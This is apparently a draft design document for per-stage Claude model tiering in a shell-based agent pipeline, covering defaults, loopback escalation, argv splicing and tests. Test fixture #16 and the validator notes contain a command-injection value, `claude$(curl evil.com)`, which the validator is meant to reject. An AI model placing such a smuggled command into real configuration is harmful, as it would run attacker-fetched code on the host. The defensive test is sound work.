---
linear: ENG-103
title: Per-stage model tiering — default cheaper models with rebase/loopback escalation
date: 2026-05-15
status: draft
---

# Per-stage model tiering — default cheaper models with rebase/loopback escalation

## 1. Problem

`bin/dispatch.sh:561-568` composes the `claude -p` argv with NO `--model`
flag:

```
gtimeout --signal=TERM --kill-after=10 "$timeout_seconds"
  claude -p
  --output-format stream-json --verbose
  --setting-sources project,local
  --disable-slash-commands
  --disallowed-tools "$denies"
  --allowed-tools "$tools"
```

So every stage — `brainstorming`, `planning`, `implementing`, `ui`,
`reviewing`, `qa`, `building`, `released`, and `retrospective` — runs on
whatever model the operator's logged-in Claude subscription session
defaults to (Opus 4.7 today). The ENG-26 telemetry already captures
`model` per dispatch in `usage-<stage>.json`
(`bin/dispatch.sh:96` records `(.modelUsage // {}) | keys | (.[0] // "")`),
and `_cost_flags_for` already plumbs `--model <name>` into every
`metrics.sh stage-end` row (`bin/run-stage.sh:87-95`). So we can see the
spend; we cannot yet steer it.

Eight stages have structurally different cognitive loads:

* `brainstorming` / `planning` — 6-persona / 5-persona review loops with
  design judgment. Hardest reasoning load. `brainstorming` already
  legitimately spans 30–60 min per ENG-65; cheaping out the model here
  would either fail the gate or burn iteration count.
* `reviewing` — cold-pass reviewers + Anti-bias scan. Meta-cognition
  about code quality. Cheap-out = reviewer leniency = bad merges =
  more loopback = NET cost INCREASE. One-shot stage, rare-firing.
* `implementing` / `ui` — code generation against a written plan.
  Pattern-following. Opus is overkill *once defensive-code drift is
  fixed* (ENG-101). This is the cost center: it runs every issue, often
  multiple times per issue under loopback.
* `qa` — split nature per ENG-38 (verification = deterministic checks;
  evaluation = judgment). Today a single pass on subscription default.
* `building` — `gh pr merge --auto --delete-branch` + a waypoint
  comment. Post-ENG-86 the orchestrator gate (`_entry_conditions_gate`,
  `bin/run-stage.sh:706-743`) runs P2 (PR-approved) in bash before
  dispatch; the agent's residual work is mechanical.

Paying Opus rates uniformly across all eight stages is the
worst-defensible default now that ENG-101 (defensive-code restraint
clause) removes the strongest argument against Sonnet on implement.

## 2. Decisions

- **D-001. Default each stage to the cheapest model that the stage's
  cognitive load tolerates, encoded as a built-in `case "$stage"` table
  in `bin/run-stage.sh::_resolve_dispatch_model` and consumed by
  `bin/dispatch.sh` via env-var hand-off.**

  Default table (canonical gerund-form keys per
  `bin/pipeline-events.json:51-60`):

  | Stage           | Default model                | Rationale |
  |---              |---                           |---|
  | `brainstorming` | `claude-opus-4-7`            | 6-persona iteration + design judgment. |
  | `planning`      | `claude-opus-4-7`            | `plan.json` + 5-persona review. Same reasoning load. |
  | `implementing`  | `claude-sonnet-4-6`          | ENG-101 baseline. Code-gen against a written plan. |
  | `ui`            | `claude-sonnet-4-6`          | Same shape as implement. |
  | `reviewing`     | `claude-opus-4-7`            | Cold-pass review meta-cognition; cheap-out = reviewer leniency = bad merges = NET cost increase. |
  | `qa`            | `claude-sonnet-4-6`          | Single pass. Becomes Haiku-verify + Sonnet-evaluate split naturally once ENG-38 ships. |
  | `building`      | `claude-haiku-4-5-20251001`  | `gh pr merge` + waypoint. Mechanical. P2 gate runs in bash pre-dispatch. |
  | `released`      | (unset — use subscription default) | Stage NOT in scope per Linear issue's defaults table; no claude-side dispatch expected to change. |

  Resolution precedence (highest → lowest), mirrors ENG-65 timeout
  resolution at `bin/dispatch.sh:469-488`:

  1. `.pipeline-config/config.json::dispatch.model[<stage>]` (operator
     pin).
  2. Built-in escalation override (D-002): on `implementing` / `ui`
     when prior `verdict result=fail target=<stage>` count ≥ 1 since
     last `to=<stage>` transition.
  3. Built-in default table above.
  4. Unset → no `--model` flag → operator subscription default
     (pre-ENG-103 behavior preserved).

  *Reference to constraint:* CLAUDE.md "Per-stage allowed tool lists are
  centralized in `dispatch.sh::allowed_tools_for`" and the ENG-65
  per-stage timeout precedent (CLAUDE.md "Per-stage dispatch timeouts")
  both reflect the centralization principle for per-stage knobs.
  Per-stage model selection is a property of "what stage X is allowed to
  do and at what tier" — same surface.

  *Reference to product principle:* CLAUDE.md "Don't add features,
  refactor, or introduce abstractions beyond what the task requires" —
  this decision adds ONE config key and ONE env var (parallel to
  `PIPELINE_DISPATCH_ID` at `bin/dispatch.sh:543-557`); it does not
  introduce a model-selector module, a tier-policy abstraction, or any
  dispatch-time hook beyond the existing `case "$stage"` pattern.

  *Rejected alternative — leave `--model` unset everywhere and rely on
  operator's subscription default:* rejected because the operator's
  default is Opus 4.7 for all stages, which is what the issue is
  fixing. This is the current behavior; documenting it as "intentional"
  is a no-op.

  *Rejected alternative — per-stage config required, no built-in
  defaults:* rejected because (a) every harness self-target operator
  would need to hand-roll the same config block, (b) target-side rollout
  on per-stage tiering hits the "discover and configure the override on
  first hit" anti-pattern called out in ENG-65 D-002 as a rejection
  rationale. Built-in defaults that match observed-good cost/quality
  trade-offs are the harness's standing convention.

  *Rejected alternative — Haiku for `building` AND `released`:*
  released-stage prompts are bounded by `Release Agent` content. The
  issue's defaults table omits `released`; D-005 explicitly limits
  scope to the seven stages it lists. Adding `released` would be scope
  creep without evidence.

  *Why `claude-opus-4-7` (not `claude-opus-4-7[1m]`) is the default
  string:* the issue's table uses `claude-opus-4-7`. The `[1m]` suffix
  signals 1M-context mode; whether this is needed at dispatch time is
  not part of the cost-tiering question. Existing `usage-<stage>.json`
  files in the metrics stream carry `model: claude-opus-4-7[1m]`
  values (see `bin/metrics-test.sh:73`), confirming the CLI accepts the
  bracketed form. Keep the unbracketed identifier in the default table;
  operators who want the 1M context add `[1m]` to their
  `dispatch.model[<stage>]` config explicitly. See OQ-1.

- **D-002. Escalation for `implementing` / `ui` fires on the unified
  signal: ≥ 1 prior `<!-- pipeline: verdict result=fail target=<stage>
  -->` marker exists on the issue since the most recent transition
  comment landing the issue at that stage. Escalation overrides the
  D-001 built-in default to `claude-opus-4-7`. Explicit config (layer
  1) wins over the escalation override. No escalation for any other
  stage.**

  *Rationale:* the escalation predicate must distinguish "this is a
  fresh implementation pass on a plan" (use Sonnet) from "this is a
  retry of an implementation that previously failed review, qa, or
  build" (use Opus — the cheap model already proved insufficient on this
  issue). The unified signal subsumes both of the issue's named
  triggers:

  - **Rebase loopback** (`building → implementing` rejection with
    `<!-- meta: metric name=merge_conflict -->` per
    `AGENT_PROMPTS.md:629`): the build agent posts `verdict result=fail
    target=implementing` per `bin/pipeline-events.json:25-30` before
    transitioning the issue back; that's the marker the count finds.
  - **Review loopback iter ≥ 2** (review rejection chains): each prior
    review-rejection posts `verdict result=fail target=implementing`,
    so iter≥2 means count≥1.

  The marker counter uses the SAME shape as
  `bin/guards.sh::count_marker_since_last_transition`
  (`bin/guards.sh:51-70`): filter `.[] |
  select(.createdAt > $last_transition_ts) | select(.body |
  contains($marker))`. New helper
  `_count_loopback_rejections_for_stage` lives in `bin/run-stage.sh`
  next to `_cost_flags_for` (line ~83), reads `bash $SCRIPT_DIR/linear.sh
  get-comments "$ident"`, and uses `parse_pipeline_marker` to project
  each comment body to `{event,result,target}`; counts the rows where
  `event=verdict result=fail target=<stage>` AND `createdAt > most
  recent transition.to=<stage> createdAt`. Returns an integer count.

  Predicate: count >= 1 → escalate.

  *Why threshold = 1 (not 2):* the cheap-model-then-escalate gradient
  needs to be steep because each loopback retry pays the FULL dispatch
  cost (Sonnet pass + scope-check + rebase + commit + push), not a
  partial cost. One failed cheap iteration on this issue is enough
  evidence; a second cheap iteration is wasted spend.

  *Reference to constraint:* CLAUDE.md "Failure-mode quick reference"
  treats loopback markers as the canonical recall mechanism (the
  `<!-- pipeline: verdict result=fail target=<stage> -->` shape is
  vocabulary-registered at `bin/pipeline-events.json:25-30`). The
  predicate reuses the established marker surface; it does not invent
  a new escalation signal.

  *Rejected alternative — read the `branch-name` and count rebase
  attempts in the git reflog as a "rebase happened" signal:* rejected
  because (a) the git reflog inside a worktree is pruned by `git gc`
  and not authoritative across orchestrator restarts, (b) the verdict
  marker is the documented inter-stage contract; bypassing it adds a
  second source of truth that can drift. The verdict marker is the
  signal `AGENT_PROMPTS.md` §3 already instructs the agent to read for
  rebase loopback (`AGENT_PROMPTS.md:629-636`).

  *Rejected alternative — escalate on count >= 2 (mirror
  `guards.sh::implement_rejection` threshold):* rejected because
  `implement_rejection` exists to trip a halt threshold (operator
  intervention), not to gate model tiering. The two predicates have
  different shapes: rejection thresholds prevent infinite-cost loops by
  HALTING, model escalation prevents one-loop wasted-cost by switching
  TIERS. A one-iteration delay on tier switch costs one extra Sonnet
  loopback per escalation chain, which is the exact regression we're
  trying to avoid.

  *Rejected alternative — escalate `reviewing` / `qa` / `building` on
  loopback too:* rejected because (a) `reviewing` already defaults to
  Opus per D-001 (no cheaper tier to escalate FROM), (b) `qa` rejection
  loopback target is `implementing` not `qa`, so the qa-stage retry path
  doesn't accumulate qa-targeted failures, (c) `building` runs only
  trivial work and is mechanically gated by `_entry_conditions_gate`,
  so even a Haiku failure escalating to Opus changes nothing material
  (the work is the same `gh pr merge --auto` invocation regardless of
  tier).

  *Rejected alternative — separate "rebase fired" predicate via a
  fresh `<!-- meta: metric name=merge_conflict -->` count:* rejected
  because the unified verdict-target signal covers it. A separate
  rebase counter would require either (a) the orchestrator emitting an
  escalation-only metric (scope creep — orchestrator doesn't read its
  own metric stream today) or (b) the agent emitting a new marker on
  every rebase (prompt-side change with no orthogonal benefit).

- **D-003. `bin/run-stage.sh` resolves the model and exports
  `PIPELINE_DISPATCH_MODEL` into `dispatch.sh`'s environment;
  `bin/dispatch.sh` splices `--model "$PIPELINE_DISPATCH_MODEL"` into
  the `claude -p` argv when the env var is non-empty.**

  *Rationale:* the escalation signal (count of `verdict result=fail
  target=<stage>` markers) requires a Linear API call. Today
  `bin/dispatch.sh` is a thin claude-wrapper — its only Linear-touching
  path is the optional `gtime`-based metric emit at the end, which is
  also routed through `metrics.sh`. Pushing the marker-count
  computation into dispatch.sh would (a) expand its responsibilities,
  (b) duplicate `linear.sh get-comments` calls (run-stage.sh already
  reads comments for `_pre_dispatch_merge_gate` / verdict-handler /
  find_fresh_verdict), (c) couple dispatch.sh's exit code to a Linear
  API outage when today the watchdog can proceed without it.

  `bin/run-stage.sh::main` already maintains a per-stage env-export
  pattern between itself and `dispatch.sh` at lines 1066-1075
  (`PIPELINE_STAGE`, `PIPELINE_DISPATCH_ID`); `PIPELINE_DISPATCH_MODEL`
  slots into the same shape with no new abstraction. Concrete
  resolution order in run-stage.sh:

  1. If config explicitly sets `dispatch.model[<stage>]`, use it.
  2. Else if stage is `implementing` or `ui` AND
     `_count_loopback_rejections_for_stage >= 1`, set
     `claude-opus-4-7` (escalation override).
  3. Else use built-in default from the D-001 table.
  4. Else (no default for the stage, e.g. `released`) leave env var
     unset; dispatch.sh omits the flag.

  dispatch.sh:561-568 splice — using a conditional `cmd+=(...)`
  appender so the two-token `--model <name>` shape (which would
  collapse to one bash array element under `${VAR:+--model "$VAR"}`)
  splits correctly into two argv positions:

  ```bash
  cmd+=(gtimeout --signal=TERM --kill-after=10 "$timeout_seconds"
    claude -p
    --output-format stream-json --verbose
  )
  [[ -n "${PIPELINE_DISPATCH_MODEL:-}" ]] && cmd+=(--model "$PIPELINE_DISPATCH_MODEL")
  cmd+=(
    --setting-sources project,local
    --disable-slash-commands
    --disallowed-tools "$denies"
    --allowed-tools "$tools"
  )
  ```

  *Reference to constraint:* CLAUDE.md "Secret-handling (ENG-46):
  Never write `${VAR:-FALLBACK}` or `${VAR:+ALTERNATE}` against env vars
  whose names match `*KEY|*TOKEN|*SECRET|ANTHROPIC*|GITHUB*|LINEAR*`."
  `PIPELINE_DISPATCH_MODEL` does NOT match any of those regexes — same
  treatment as `PIPELINE_DISPATCH_ID` (`bin/dispatch.sh:555`) and
  `PIPELINE_STAGE` (`bin/dispatch.sh:556`), both ENG-46-lint-clean.
  The conditional `[[ -n "${VAR:-}" ]] && cmd+=(...)` form is the
  presence-gated emit pattern explicitly safe for non-secret names
  (and is what the existing dispatch.sh `_cfg_minutes` resolver uses
  at line 481).

  *Rejected alternative — pass `--model` as a positional flag to
  `dispatch.sh`:* rejected because the env-var pattern matches the
  existing run-stage→dispatch hand-off contract (`PIPELINE_ISSUE_ID`,
  `PIPELINE_DISPATCH_ID`, `PIPELINE_STAGE`, `PIPELINE_WRITER`,
  `PIPELINE_DRY_RUN`). Adding a positional arg fans out the surface
  area (existing test fixtures at `bin/dispatch-test.sh` expect a
  3-arg signature `dispatch.sh <stage> <prompt_file> [<log_file>]`)
  for no semantic gain.

  *Rejected alternative — resolve model INSIDE dispatch.sh by calling
  linear.sh from there:* rejected per the responsibility-shape
  rationale above. Coupling dispatch.sh to a Linear read also opens an
  unguarded failure path: today dispatch.sh on a Linear API outage
  still runs claude and writes usage; with the change it would either
  block on the Linear read or silently degrade tier selection.

- **D-004. The resolved model is recorded in two places: (a) a Linear
  log line `log "dispatch model=$resolved_model (stage=$stage)"`
  written by run-stage.sh before invoking dispatch.sh, (b) the
  authoritative per-dispatch model is the `usage-<stage>.json::model`
  field that the renderer extracts from claude's `result` event
  (`bin/dispatch.sh:96`) — what claude ACTUALLY billed against.**

  *Rationale:* "resolved" vs "actually used" can diverge if the
  subscription account doesn't have access to the resolved model. Today
  claude returns the substituted model in the `system`/`init` event's
  `.model` field (per `bin/dispatch.sh:72`) which the renderer extracts
  into `usage-<stage>.json` via `(.modelUsage // {}) | keys`. Treating
  `usage-<stage>.json::model` as authoritative preserves audit
  fidelity; the log line is purely for operator-visible orchestrator-
  side trace.

  *Reference to constraint:* CLAUDE.md ENG-26 "telemetry already
  captures `model` per event; spot-check post-ship metrics to confirm
  the cost drop is realised" — the issue's Mechanism §5. The mechanism
  is already in place; this decision is a no-op that documents the
  invariant.

  *Rejected alternative — write the resolved-vs-actual diff to a
  separate sidecar file:* rejected as scope creep. The retrospective
  agent can join the usage events with the orchestrator log to
  reconstruct any drift; no need for a new on-disk surface.

- **D-005. Scope: D-001 + D-002 modify the seven stages in the Linear
  issue's defaults table (`brainstorming`, `planning`, `implementing`,
  `ui`, `reviewing`, `qa`, `building`). `released` and `retrospective`
  remain unchanged (no `--model` flag, subscription default).**

  *Rationale:* the Linear issue's "Out of scope" §3 explicitly excludes
  retrospective ("runs weekly, cost is rounding error"). The `released`
  stage is not in the defaults table; its agent body emits
  release-summary prose against an already-merged PR — single-shot,
  low-frequency. The default Opus 4.7 cost on `released` is ~$0.50 per
  release; the entire annual cost of `released` dispatches at current
  release cadence is under $20/year. Optimization opportunity is
  rounding error; risk of breaking the release-comment prose quality
  is non-trivial; left alone.

  *Reference to constraint:* CLAUDE.md "Don't add features, refactor,
  or introduce abstractions beyond what the task requires." Stages not
  named in the issue's defaults table are out of scope.

  *Rejected alternative — tier `released` to Haiku because its work is
  "post-merge summary, no judgment":* rejected because (a) the issue
  doesn't ask for it, (b) the savings are sub-$20/yr, (c) we'd need a
  separate evaluation of release-summary quality at Haiku tier, (d)
  the existing `subscription default` fallback is the conservative
  no-op.

- **D-006. Test coverage lives in a NEW `bin/run-stage-model-test.sh`
  (sibling to `bin/run-stage-test.sh`), with one fixture per
  resolution-precedence layer plus escalation cases. `bin/dispatch-test.sh`
  gains ONE new fixture asserting the `--model` argv splice in the
  dry-run logged line.**

  *Rationale:* the resolution logic (D-003 precedence) is run-stage
  logic; the argv splice (D-003 dispatch.sh edit) is dispatch logic.
  Splitting along the existing test-file boundary keeps both files
  scoped to their owner script (CLAUDE.md "Tests are sibling shell
  scripts").

  Fixture list (`bin/run-stage-model-test.sh`):

  | # | Stage           | Config `dispatch.model[<stage>]` | Prior `fail target=<stage>` count | Expected `PIPELINE_DISPATCH_MODEL` |
  |---|---              |---                               |---                                |---|
  | 1 | brainstorming   | (unset)                          | 0                                 | `claude-opus-4-7` |
  | 2 | planning        | (unset)                          | 0                                 | `claude-opus-4-7` |
  | 3 | implementing    | (unset)                          | 0                                 | `claude-sonnet-4-6` |
  | 4 | implementing    | (unset)                          | 1                                 | `claude-opus-4-7` (escalated) |
  | 5 | implementing    | (unset)                          | 3                                 | `claude-opus-4-7` (escalated) |
  | 6 | ui              | (unset)                          | 0                                 | `claude-sonnet-4-6` |
  | 7 | ui              | (unset)                          | 2                                 | `claude-opus-4-7` (escalated) |
  | 8 | reviewing       | (unset)                          | 0                                 | `claude-opus-4-7` |
  | 9 | qa              | (unset)                          | 0                                 | `claude-sonnet-4-6` |
  |10 | building        | (unset)                          | 0                                 | `claude-haiku-4-5-20251001` |
  |11 | released        | (unset)                          | 0                                 | (unset → no flag)              |
  |12 | implementing    | `claude-opus-4-7[1m]`            | 0                                 | `claude-opus-4-7[1m]` (config overrides default) |
  |13 | implementing    | `claude-sonnet-4-6`              | 5                                 | `claude-sonnet-4-6` (config overrides escalation; explicit config WINS) |
  |14 | implementing    | (jq integer 60, not string)      | 0                                 | `claude-sonnet-4-6` (D-001 fallthrough; type-mismatched config silently ignored) |
  |15 | implementing    | (unset, latest transition newer than the only fail marker) | 0 | `claude-sonnet-4-6` (count gated on since-last-transition; rule resets) |
  |16 | implementing    | `claude$(curl evil.com)` (shell-meta payload) | 0                | `claude-sonnet-4-6` (regex validator rejects; falls through to default) |

  *Rationale for #13:* operator-set config is the highest precedence
  by design (D-001 precedence layer 1 above the escalation override).
  If an operator explicitly pins implement to Sonnet, escalation
  doesn't second-guess them; the operator owns the trade-off. This
  matches the existing `dispatch_timeout_minutes_per_stage` precedence
  shape (ENG-65 D-002 lets operator config disable per-stage timeout
  bumps).

  Fixture for `bin/dispatch-test.sh` (one new case, in Group 5 next to
  existing timeout fixtures at lines ~296-322):

  - PIPELINE_DISPATCH_MODEL=`claude-sonnet-4-6` + PIPELINE_DRY_RUN=1 →
    assert dry-run log contains `--model claude-sonnet-4-6` in the
    would-invoke line.
  - PIPELINE_DISPATCH_MODEL unset + PIPELINE_DRY_RUN=1 → assert
    dry-run log contains NO `--model` token (subscription default
    preserved).

  *Reference to constraint:* CLAUDE.md "Tests are sibling shell scripts
  named `*-test.sh` in `bin/`. There is no test runner." Adding
  `bin/run-stage-model-test.sh` matches this pattern; it slots into the
  pre-commit hook's `bash bin/*-test.sh` enumeration with no runner
  change.

  *Rejected alternative — single-file test in `bin/dispatch-test.sh`:*
  rejected because the resolution logic lives in `run-stage.sh`;
  testing it from `dispatch-test.sh` would couple dispatch test
  fixtures to run-stage internals.

- **D-007. CLAUDE.md gains a new subsection "Per-stage dispatch model
  (ENG-103)" alongside the existing "Per-stage dispatch timeouts
  (ENG-65)" subsection documenting the config schema, defaults table,
  and escalation predicate.**

  *Rationale:* the existing CLAUDE.md "Per-stage dispatch timeouts"
  section is the operator-facing surface for the parallel knob; the new
  surface gets the same treatment for consistency. The default table
  is duplicated between brainstorm (this doc, for design audit),
  CLAUDE.md (operator usage), and run-stage.sh (code-level truth). The
  code-level truth wins; CLAUDE.md and brainstorm are commentary.

  *Reference to constraint:* CLAUDE.md is the project-instructions
  surface; operator-facing knobs documented there is the established
  pattern (cf. "Per-target dispatch.tools extras", "Per-stage dispatch
  timeouts", "Per-project dispatch concurrency").

  *Rejected alternative — defer the CLAUDE.md edit to a follow-up
  ticket:* rejected because the operator who learns about the
  `dispatch.model` config from the issue Linear comment but not from
  CLAUDE.md has to dig through the brainstorm to find the schema. The
  cost of one paragraph in CLAUDE.md is trivial; the cost of a missing
  knob doc is real.

- **D-008. The implementing-stage cut-over from Opus 4.7 to Sonnet 4.6
  (the only D-001 row that actually changes behavior — every other
  stage either stays Opus or moves between cheaper tiers) is gated on
  ENG-101 having shipped. The brainstorm authors the config schema and
  the default-table code in this issue; rollout of the Sonnet default
  for `implementing` is staged.**

  *Rationale:* the Linear issue explicitly notes "**Blocked by**
  [ENG-101] — Sonnet-as-implement-default rests on defensive-code
  restraint holding without Opus reasoning. Until [ENG-101] ships and
  stabilises, implement stays Opus." We verified ENG-101's restraint
  clause is NOT yet in `AGENT_PROMPTS.md` (grep returns zero). Two
  reasonable cut-over postures:

  - **A. Land code + ship Sonnet-default immediately (block this
    issue's merge on ENG-101 merging first).** Simplest staging; one
    Linear ordering constraint to manage.
  - **B. Land code with Opus default for implementing (matching
    today's behavior), then flip the default in a follow-up commit
    when ENG-101 is observed to have stabilised.** Two commits, but
    decouples the rollout risk.

  Recommended posture: **A** (block this issue's plan/implement on
  ENG-101 first). The cost of the constraint is one Linear-side
  blocked-by relation; the cost of B is an extra commit that exists
  only as a knob-flip, which is the kind of partial implementation
  the CLAUDE.md "Don't ship half-finished implementations" preamble
  argues against.

  Build-stage (Haiku) and qa-stage (Sonnet) cut-overs are NOT blocked
  by ENG-101 — they have no analogous "defensive-code training pull"
  failure mode. They can ship with the main D-001 change.

  *Reference to constraint:* Linear issue's "Blocked by" §.

  *Rejected alternative — ship Sonnet-default for implementing
  without waiting for ENG-101:* rejected because the issue's
  blocked-by clause is load-bearing; the scope-violation risk on
  defensive-code drift would erase the cost savings (scope-violation
  retries pay full Opus rates anyway via the D-002 escalation
  override).

## 3. Architecture

### Files modified

1. **`bin/run-stage.sh`** — D-002, D-003, D-004 (log line).

   - New helper `_resolve_dispatch_model "<stage>" "<ident>"` placed
     adjacent to `_cost_flags_for` at the cost-telemetry helpers
     block (`bin/run-stage.sh:69-95`). Reads config + escalation +
     defaults per D-003 precedence and prints the resolved model
     string (empty = no model flag).

   - New helper `_count_loopback_rejections_for_stage "<ident>"
     "<stage>"` placed adjacent to it. Reads `bash $SCRIPT_DIR/linear.sh
     get-comments "$ident"`, finds the most recent `<!-- pipeline:
     transition ... to=<stage> -->` `createdAt`, then counts comments
     newer than that ts whose body, when projected via
     `parse_pipeline_marker`, yields `{event:"verdict", result:"fail",
     target:"<stage>"}`. Returns the count as an integer. Soft-fail to
     0 on Linear API error (consistent with the dispatch-side fail-open
     posture of ENG-86 entry-conditions, `bin/run-stage.sh:735` falls
     through to dispatch on error).

   - In `main()` at the dispatch-call block (`bin/run-stage.sh:1156-1162`),
     resolve the model before the `dispatch.sh` invocation and export
     it:

     ```bash
     local resolved_model
     resolved_model="$(_resolve_dispatch_model "$stage" "$ident" || printf '')"
     [[ -n "$resolved_model" ]] && log "dispatch model=$resolved_model (stage=$stage)"
     PIPELINE_ISSUE_ID="$ident" \
       PIPELINE_DISPATCH_MODEL="$resolved_model" \
       bash "$SCRIPT_DIR/dispatch.sh" "$stage" "$prompt_file" "$log_file" \
       || dispatch_rc=$?
     ```

     Same env-export shape as the existing `PIPELINE_ISSUE_ID` line at
     `bin/run-stage.sh:1160`. Empty `$resolved_model` propagates as an
     empty env var which dispatch.sh's `[[ -n ... ]]` test correctly
     elides.

2. **`bin/dispatch.sh`** — D-003 (argv splice).

   - At the `cmd` composition block (`bin/dispatch.sh:561-568`), split
     into three array-append calls and conditionally append the
     `--model <name>` pair when `PIPELINE_DISPATCH_MODEL` is non-empty:

     ```bash
     cmd+=(gtimeout --signal=TERM --kill-after=10 "$timeout_seconds"
       claude -p
       --output-format stream-json --verbose
     )
     [[ -n "${PIPELINE_DISPATCH_MODEL:-}" ]] && cmd+=(--model "$PIPELINE_DISPATCH_MODEL")
     cmd+=(
       --setting-sources project,local
       --disable-slash-commands
       --disallowed-tools "$denies"
       --allowed-tools "$tools"
     )
     ```

   - In the DRY_RUN branch (`bin/dispatch.sh:511-517`), include
     `--model "$PIPELINE_DISPATCH_MODEL"` in the would-invoke log
     when set. This is what `bin/dispatch-test.sh`'s new fixture
     greps for.

3. **`bin/run-stage-model-test.sh`** — NEW file. D-006 fixtures.

   - Sources `bin/run-stage.sh` via the test sentinel pattern
     (`if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then main "$@"; fi`,
     CLAUDE.md "Tests are sibling shell scripts" §). Stubs
     `bin/linear.sh get-comments` output via STUB_DIR.

   - Asserts `_resolve_dispatch_model "<stage>" "<ident>"` returns the
     D-006 table's expected model. Each fixture sets up a fake Linear
     comment fixture via stub-printed JSON and asserts the returned
     model literal.

   - Includes fixture #16 (adversarial shell-meta config payload) to
     anchor the regex-validator's rejection behavior.

4. **`bin/dispatch-test.sh`** — D-006 dispatch-side fixture.

   - One new test case in Group 5 (where the existing
     `dispatch_timeout_minutes` fixtures live, lines 296-322): set
     PIPELINE_DISPATCH_MODEL=`claude-sonnet-4-6`, PIPELINE_DRY_RUN=1,
     invoke dispatch.sh with a fixture prompt, assert dry-run log
     contains `--model claude-sonnet-4-6`. Mirror with
     PIPELINE_DISPATCH_MODEL unset → assert log contains no
     `--model`.

5. **`CLAUDE.md`** — D-007 doc edit.

   - New subsection "Per-stage dispatch model (ENG-103)" added
     alongside the existing "Per-stage dispatch timeouts (ENG-65)"
     section. Schema, defaults table (duplicated from this brainstorm
     for operator convenience), escalation predicate, and the
     `dispatch.model[<stage>]` config-override example. Length ≈
     35-50 lines, mirroring the ENG-65 section's depth.

### Files NOT modified (intentional)

- **`AGENT_PROMPTS.md`** — D-001 / D-002 / D-003 are
  orchestrator-side; the agent prompt is unchanged. The cheap-tier
  agents will follow the exact same prompts they do today; the model
  difference is the orchestrator's responsibility. (ENG-101's
  prompt-side restraint clause is a separate edit owned by the
  ENG-101 ticket.)

- **`bin/verdict-handler.sh`** — D-002's escalation predicate reads
  the same loopback-marker shape verdict-handler already parses
  (`bin/verdict-handler.sh:243` writes the `pipeline-rejection`
  marker shape for `verdict result=fail`). No new marker, no new
  registry entry.

- **`bin/pipeline-events.json`** — no vocabulary change; the existing
  `fail_targets: ["brainstorming","planning","implementing","ui"]`
  is already what the escalation predicate reads.

- **`bin/metrics.sh`** — already accepts `--model <name>`
  (`bin/metrics.sh:7,25,34,66-73`); the model field continues to flow
  from `usage-<stage>.json::model` via `_cost_flags_for`.
  Spot-checking the realised cost drop post-ship is reading the
  existing events.jsonl stream; no schema change.

- **`bin/guards.sh::count_marker_since_last_transition`** — similar
  shape to what D-002 needs, but the existing helper matches against
  `<!-- meta: metric name=<counter> -->` shapes (rejection counters),
  not against `<!-- pipeline: verdict result=fail target=<stage> -->`.
  Adding a new helper in `run-stage.sh` (not extending guards.sh) is
  the right placement: model resolution is a run-stage concern, the
  rejection-counter guard is a separate halt-threshold concern.

- **`bin/run-local.sh`** — orchestrator entrypoint; doesn't touch
  per-dispatch model. The env-var hand-off
  (`PIPELINE_DISPATCH_MODEL`) is run-stage.sh → dispatch.sh only.

- **`learned-rules/<slug>/project-profile.md`** — the profile drives
  `## File layout`, `## Tool allowlist`, and `## Build & test gates`
  per `docs/architecture.md:62-69`. Model selection is per-stage, not
  per-target-stack; it does not belong in the profile. (A future
  ticket could add per-target overrides via `dispatch.model[<stage>]`
  in the target's `.pipeline-config/config.json`; that's already in
  scope for D-001 layer-1 precedence.)

## 4. Data flow

Two flows, plus one observability path.

### Flow 1: cheap-tier default dispatch (the common case post-ENG-101)

```
launchd tick
  → run-local.sh
    → poll picks (ENG-N, implementing)
    → run-stage.sh main()
      → _resolve_dispatch_model "implementing" "ENG-N"
          → check .pipeline-config/config.json::dispatch.model.implementing  → unset
          → check _count_loopback_rejections_for_stage "ENG-N" "implementing"
              → bash bin/linear.sh get-comments ENG-N
              → find latest "<!-- pipeline: transition ... to=implementing -->" createdAt
              → count comments newer with verdict-event result=fail target=implementing
              → returns 0
          → return built-in default "claude-sonnet-4-6"
      → log "dispatch model=claude-sonnet-4-6 (stage=implementing)"
      → PIPELINE_DISPATCH_MODEL=claude-sonnet-4-6 bash dispatch.sh implementing ...
        → dispatch.sh main()
          → cmd composition includes --model claude-sonnet-4-6
          → claude -p --model claude-sonnet-4-6 ...
          → stream-json renderer writes usage-implementing.json::model = "claude-sonnet-4-6"
      → metrics.sh stage-end ... --model claude-sonnet-4-6 ... → events.jsonl
```

### Flow 2: escalated dispatch (loopback retry)

```
launchd tick (a later tick after a build P6 rejection or review fail)
  → run-stage.sh main()
    → _resolve_dispatch_model "implementing" "ENG-N"
        → config: unset
        → _count_loopback_rejections_for_stage → 1 (matches the build → implementing
                                                    rejection just transitioned)
        → return "claude-opus-4-7" (escalation override)
    → log "dispatch model=claude-opus-4-7 (stage=implementing, escalated)"
    → PIPELINE_DISPATCH_MODEL=claude-opus-4-7 bash dispatch.sh ...
```

After the escalated Opus pass succeeds, the next tick at `reviewing`
sees the `<!-- pipeline: transition from=implementing to=reviewing -->`
comment. If that review fails AGAIN and loops back to implementing, the
count at the NEXT implementing dispatch is 2 (two prior verdict-fails
exist since the most recent `to=implementing` transition). Still
escalated, same outcome — no behavior cliff at count ≥ 2.

When the issue eventually transitions forward (`implementing → ui →
reviewing → qa → building → released`), the next implementing dispatch
on a SUBSEQUENT issue starts fresh — its count is gated on the
most-recent `to=implementing` transition for THAT issue.

### Flow 3: observability spot-check (operator-facing)

```
post-ship, operator runs:
  bash bin/status.sh
    → tails events.jsonl
    → per-stage cost rollup includes the "model" column
    → operator can confirm:
        - implementing rows show model=claude-sonnet-4-6 on first passes
        - implementing rows show model=claude-opus-4-7 on retries
        - building rows show model=claude-haiku-4-5-20251001
        - cost per-stage row drops ≥ 50% on implement, ≥ 70% on build
```

ENG-26's existing per-stage telemetry surface is the audit channel
(per `_cost_flags_for` at `bin/run-stage.sh:83-95`); no new metric type,
no schema change.

## 5. Error handling

### Missing config file

`_resolve_dispatch_model` reads `.pipeline-config/config.json` via
`jq -r --arg s "$stage" '.dispatch.model[$s] // empty' "$CONFIG"
2>/dev/null || true`. Missing file or unreadable returns empty (per
the existing `_cfg_minutes` pattern at `bin/dispatch.sh:475-481`); the
escalation path is checked next.

### Malformed config (non-string model value, e.g. integer)

`jq` returns the raw value; the helper validates with `[[ "$resolved"
=~ ^[A-Za-z0-9._\[\]:-]+$ ]]` (claude model names contain `-`, `.`,
brackets `[1m]`, alphanumeric; the regex permits the bracketed form
but rejects shell-meta-bearing payloads like `$(curl …)`, `;`, `&`,
